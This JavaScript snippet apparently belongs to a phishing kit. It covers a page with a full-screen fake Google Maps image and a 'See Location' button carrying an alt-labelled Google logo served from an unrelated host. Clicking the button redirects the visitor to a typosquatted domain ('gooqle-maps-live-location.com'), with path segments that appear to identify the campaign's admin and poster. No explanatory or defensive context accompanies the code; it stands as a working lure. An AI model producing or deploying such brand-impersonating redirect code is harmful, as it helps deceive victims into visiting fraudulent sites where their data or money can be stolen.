
const website='https://www.gooqle-maps-live-location.com'
console.log("poster:", poster);
console.log("Admin:",admin);
const site = website + '/' + admin + '/' + poster 
const overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.top = "0";
overlay.style.left = "0";
overlay.style.width = "100%";
overlay.style.height = "100%";
overlay.style.backgroundRepeat = "no-repeat";
overlay.style.backgroundSize = "cover"; 
overlay.style.backgroundPosition = "center"; 
overlay.style.zIndex = "9999"; 
overlay.style.display = "flex";
overlay.style.alignItems = "center";
overlay.style.justifyContent = "center";
overlay.style.color = "white";
overlay.style.fontSize = "24px";
overlay.style.fontFamily = "Arial, sans-serif";

function updateBackground() {
    if (window.innerWidth <= 768) {
        overlay.style.backgroundImage = "url('https://newsite-livid.vercel.app/maps.PNG')"; 
    } else {
        overlay.style.backgroundImage = "url('https://newsite-livid.vercel.app/maps.PNG')"; 
    }
}

updateBackground();

window.addEventListener("resize", updateBackground);
overlay.innerHTML = `
<div style="
    display: flex;
    align-items: center;
    background-color: #f1f5f9;
    color: #374151;
    padding: 10px 20px;
    border-radius: 9999px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    font-family: Arial, sans-serif;
    cursor: pointer;
    transition: background-color 0.3s;
" 
onmouseover="this.style.backgroundColor='#e2e8f0'" 
onmouseout="this.style.backgroundColor='#f1f5f9'">
    <img src="https://test.escortbabylone.info/img/favicon-removebg-preview.png" alt="Google Logo" style="
        width: 30px;
        height: 30px;
        margin-right: 8px;
    ">
    <span>See Location</span>
</div>
`;
overlay.style.overflow = "auto"; // Allow scrolling if needed


document.body.appendChild(overlay);

overlay.addEventListener("click", () => {
    window.location.href = site;});





